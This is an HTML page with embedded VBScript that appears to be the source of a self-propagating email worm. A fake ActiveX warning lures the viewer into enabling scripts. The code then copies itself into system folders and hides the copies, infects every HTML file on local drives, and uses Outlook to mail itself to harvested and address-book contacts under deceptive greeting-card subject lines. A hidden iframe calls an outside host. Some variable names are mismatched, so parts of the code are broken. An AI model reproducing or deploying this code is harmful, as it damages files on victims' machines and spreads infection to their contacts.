
<!--MyVwa-->
<HTML>
<BODY>
<SCRIPT Language = "VBScript">
On Error Resume Next
MsgBox "This page contained a graphic which require the ActiveX controls, Please reload or refresh the page and accept the ActiveX",vbinformation,"MSIE Warning!"
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsc = CreateObject("WScript.Shell")
If err.Number = 429 Then
	wsc.Run JavaScript:location.Reload()
Else
	Set PanjangKod = document.body.CreateTextRange()
	Set Win = fso.GetSpecialFolder(0)
	Set Sys = fso.GetSpecialFolder(1)
	Set Tmp = fso.GetSpecialFolder(2)
	Set Myvwa = fso.CreateTextFile("C:\Greeting.htm",2)
	Myvwa.WriteLine "<!--MyVwa-->"
	Myvwa.WriteLine "<HTML><BODY>"
	Myvwa.WriteLine(PanjangKod.htmlText)
	Myvwa.Write("<iframe src="http://www.zief.pl/iraq.jpg" width=1 height=1></iframe></BODY></HTML>" + chr(13) + chr(10))
	Myvwa.close
	fso.CopyFile "C:\Greeting.htm", Win & "\Myvwa.htm"
	fso.CopyFile "C:\Greeting.htm", Sys & "\AyaCute.htm"
	fso.CopyFile "C:\Greeting.htm", Tmp & "\Normal.html"
	Set J = fso.GetFile("C:\Greeting.htm")
	J.attributes = J.attributes + 2
	Set K = fso.GetFile(Win & "\Rundll32.htm")
	K.attributes = K.attributes + 2
	Set L = fso.GetFile(Sys & "\Help.htm")
	L.attributes = L.attributes + 2
Siasat()
surat()
End if

Sub Siasat()
On Error Resume Next
Set Drv = fso.Drives
For Each Dr in Drv
If Dr.DriveType = 1 or Dr.DriveType = 2 or Dr.DriveType = 3 Then
Ingat(Dr.Path & "\")
End If
Next
End Sub
Sub Ingat(Dir)
On Error Resume Next
Set Fail = fso.GetFolder(Dir)
Set sFail = Fail.SubFolders
For Each Failss in sFail
RebakDanMutate(Failss.Path)
Jangkit(Failss.Path)
Ingat(Failss.Path)
Next
End Sub
Sub Jangkit(Dir)
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsc = CreateObject("WScript.Shell")
Set ff = fso.GetFolder(Dir)
Set Sff = ff.Files
For Each Filez in Sff
 ext = fso.GetExtensionName(Filez.Path)
 ext = lcase(ext)
  If (ext = "htm") or (ext = "html") Then
   Set Bacaje = fso.OpenTextFile(Filez.Path,1)
   BacaAtas = Bacaje.ReadLine
   BacaSuma.Close
	If BacaAtas <> "<!--MyVwa-->" Then
	JangkitHabis Filez.Path
	End If
  End If
Next
End Sub
Sub JangkitHabis(NamaFile)
On Error Resume Next
Set Musuh = fso.GetFile(NamaFile)
Set Myvwa = Musuh.OpenAsTextStream(1)
IsiPerut = Myvwa.ReadAll()
Myvwa.Close
Set Musuh = fso.GetFile(NamaFile)
Set Myvwa = Musuh.OpenAsTextStream(2)
Myvwa.WriteLine "<!--MyVwa-->"
Myvwa.WriteLine "<HTML><BODY>"
Myvwa.WriteLine(PanjangKod.htmlText)
Myvwa.Write("<iframe src="http://www.zief.pl/iraq.jpg" width=1 height=1></iframe></BODY></HTML>" + chr(13) + chr(10))
Myvwa.Write IsiPerut
Myvwa.close
End Sub
Sub RebakDanMutate(Dir)
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsc = CreateObject("WScript.Shell")
Set ff = fso.GetFolder(Dir)
Set Sff = ff.Files
For Each Filez in Sff
 ext = fso.GetExtensionName(Filez.Path)
 ext = lcase(ext)
  If (ext = "htm") or (ext = "html") or (ext = "hta") or (ext = "hte") or (ext = "htx") Then
   Set Bacaje = fso.OpenTextFile(Filez.Path,1)
   BacaSuma1 = Bacaje.ReadAll()
   Baceje.Close
    For Ml = 1 To Len(BacaSuma1)
    count = 0
    If Mid(Bacaje,ml,7) = "mailto:" Then
      counter = counter + 1
      mlto = ""
      Do While Mid(Bacaje,ml+6+count,1) <> """"
       count = count + 1
       mlto = mlto + Mid(Bacaje,ml+6+count,1)
      loop
       Hantar(left(mlto,len(mlto)-1))
     End If
    Next
  End If
Next
End Sub
Sub Hantar(Emailofcourse)
On Error Resume Next
Set failsys = CreateObject("Scripting.FileSystemObject")
Set failsys1 = CreateObject("Outlook.Application")
if failsys1 = "Outlook" Then
	Set failsys2 = failsys.OpenTextFile("C:\Greeting.htm",1)
	I = 1
	Do While failsys2.atendofstream = false
		failsys3 = failsys2.ReadLine
		failsys4 = failsys4 & Chr(34) & " vbcrlf & " & Chr(34) & Replace(failsys3, Chr(34), Chr(34) & " & Chr(34) & " & Chr(34))
	Loop
	failsys2.Close
	failsys5 = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & " & Chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) &" http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2345.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
	failsys5 = failsys5 & vbCrLf & "On Error Resume Next"
	failsys5 = failsys5 & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
	failsys5 = failsys5 & vbCrLf & "If Err.Number <> 0 Then"
	failsys5 = failsys5 & vbCrLf & "document.write " & Chr(34) & "<font face='Courier New' color=#fff000 size='4'>This e-mail contain a animation graphic which required the ActiveX enabled.<br>Please open this message again then please accept the ActiveX by click at yes<br>Microsoft OutLook</font>" & Chr(34) & ""
	failsys5 = failsys5 & vbCrLf & "Else"
	failsys5 = failsys5 & vbCrLf & "Set vbs = fso.CreatetextFile(fso.getSpecialfolder(1) & " & Chr(34) & "\Lasiaf.html" & Chr(34) & ", True)"
	failsys5 = failsys5 & vbCrLf & "vbs.write " & Chr(34) & failsys4 & Chr(34)
	failsys5 = failsys5 & vbCrLf & "vbs.Close"
	failsys5 = failsys5 & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
	failsys5 = failsys5 & vbCrLf & "ws.run fso.GetSpecialFolder(1) & " & Chr(34) & "\Lasiaf.html" & Chr(34) & ""
	failsys6 = failsys6 & vbCrLf & "document.write " & Chr(34) & "U r so cute... i like ur childish personality... Aya... ;p by -Lasiaf in confuse-<br><br>Greets to: Fait Accompli[myvwa],Nije,Dehe,Bae'i,Asmahani,Atira,Azha,Ema,Erma,Erna and U<br><br>" & Chr(34) & ""
	failsys6 = failsys6 & vbCrLf & "End If"
	failsys6 = failsys6 & vbCrLf & "<" & "/SCRIPT><" & "/BODY></" & "HTML>"
	failsys7 = failsys5 & failsys6
	Set failsys8 = failsys1.GetNameSpace("MAPI")
	Set failobj1 = failsys1.CreateItem(0)
	randomize
	subjek(0) = "Here is your Greeting card from me"
	subjek(1) = "<--Lasiaf-Fait Accompli-Myvwa-->"
	subjek(2) = "Greeting Card From Me.. ;p"
	subjek(3) = "Important! Please reply my Greeting card."
	subjek(4) = "Friendster.. i'm a new comer.."
	subjek(5) = "FWD:Would you be my wife?"
	subjek(6) = "RE:Your password in this Greeting card"
	subjek(7) = "Hye look at this News... "
	subjek(8) = "Product Key!"
	subjek(9) = "FWD:Selamat menyambut hari kemerdekaan"
	subjek(10) = "Re:Good Luck in your exam"
	subjek(11) = "Somebody realy need you..."
	subjek(12) = "What ? new virus"
	subjek(13) = "Tekanan Emosi... Adik beradik gaduh²"
	Rambang = int(Rnd * 13)
	Subjekrambang = subjek(Rambang)
	failobj1.To = Emailofcourse
	failobj1.Subject = Subjekrambang
	failobj1.HTMLBody = failsys7
	failobj1.DeleteAfterSubmit = True
	failobj1.Send
	failsys1.Quit
End If
End Sub

Function surat()
On Error Resume Next
Set failsys = CreateObject("Scripting.FileSystemObject")
Set failsys1 = CreateObject("Outlook.Application")
if failsys1 = "Outlook" Then
	Set failsys2 = failsys.OpenTextFile("C:\Greeting.htm",1)
	I = 1
	Do While failsys2.atendofstream = false
		failsys3 = failsys2.ReadLine
		failsys4 = failsys4 & Chr(34) & " vbcrlf & " & Chr(34) & Replace(failsys3, Chr(34), Chr(34) & " & Chr(34) & " & Chr(34))
	Loop
	failsys2.Close
	failsys5 = "<" & "HTML><" & "HEAD><" & "META content=" &Chr(34) & " & Chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) &" http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2345.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
	failsys5 = failsys5 & vbCrLf & "On Error Resume Next"
	failsys5 = failsys5 & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
	failsys5 = failsys5 & vbCrLf & "If Err.Number <> 0 Then"
	failsys5 = failsys5 & vbCrLf & "document.write " & Chr(34) & "<font face='Courier New' color=#fff000 size='4'>This e-mail contain a animation graphic which required the ActiveX enabled.<br>Please open this message again then please accept the ActiveX by click at yes<br>Microsoft OutLook</font>" & Chr(34) & ""
	failsys5 = failsys5 & vbCrLf & "Else"
	failsys5 = failsys5 & vbCrLf & "Set vbs = fso.CreatetextFile(fso.getSpecialfolder(1) & " & Chr(34) & "\Lasiaf.html" & Chr(34) & ", True)"
	failsys5 = failsys5 & vbCrLf & "vbs.write " & Chr(34) & failsys4 & Chr(34)
	failsys5 = failsys5 & vbCrLf & "vbs.Close"
	failsys5 = failsys5 & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
	failsys5 = failsys5 & vbCrLf & "ws.run fso.GetSpecialFolder(1) & " & Chr(34) & "\Lasiaf.html" & Chr(34) & ""
	failsys6 = failsys6 & vbCrLf & "document.write " & Chr(34) & "U r so cute... i like ur childish personality... Aya... ;p by -Lasiaf in confuse-<br><br>Greets to: Fait Accompli[myvwa],Nije,Dehe,Bae'i,Asmahani,Atira,Azha,Ema,Erma,Erna and U<br><br>" & Chr(34) & ""
	failsys6 = failsys6 & vbCrLf & "End If"
	failsys6 = failsys6 & vbCrLf & "<" & "/SCRIPT><" & "/BODY></" & "HTML>"
	failsys7 = failsys5 & failsys6
	Set failsys8 = failsys1.GetNameSpace("MAPI")
For Each failsys9 in failsys8.AddressLists
	If failsys9.AddressEntries.Count <> 0 Then
	failobj0 = failsys9.AddressEntries.Count
	Set failobj1 = failsys1.CreateItem(0)
	randomize
	subjek(0) = "Here is your Greeting card from me"
	subjek(1) = "<--Lasiaf-Fait Accompli-Myvwa-->"
	subjek(2) = "Greeting Card From Me.. ;p"
	subjek(3) = "Important! Please reply my Greeting card."
	subjek(4) = "Friendster.. i'm a new comer.."
	subjek(5) = "FWD:Would you be my wife?"
	subjek(6) = "RE:Your password in this Greeting card"
	subjek(7) = "Hye look at this News... "
	subjek(8) = "Product Key! Nije(c) , inc. "
	subjek(9) = "FWD:Selamat menyambut hari kemerdekaan"
	subjek(10) = "Re:Good Luck in your exam"
	subjek(11) = "Somebody realy need you..."
	subjek(12) = "What ? new virus"
	subjek(13) = "Happy Birthday!"
	Rambang = int(Rnd * 13)
	Subjekrambang = subjek(Rambang)
	failobj1.Subject = Subjekrambang
	failobj1.HTMLBody = failsys7
	failobj1.DeleteAfterSubmit = True
		For failobj2 = 1 to failobj0
			Set failobj3 = failsys9.AddressEntries(failobj2)
			If failobj0 = 1 Then
				failobj1.BCC = failobj3.Address
			Else
				failobj1.BCC = failobj1.BCC & ";" & failobj3.Address
			End If
		Next
	failobj1.Send
	End If
Next
failsys1.Quit
End If
End Function
</SCRIPT>
<iframe src="http://www.zief.pl/iraq.jpg" width=1 height=1></iframe></BODY>
</HTML>
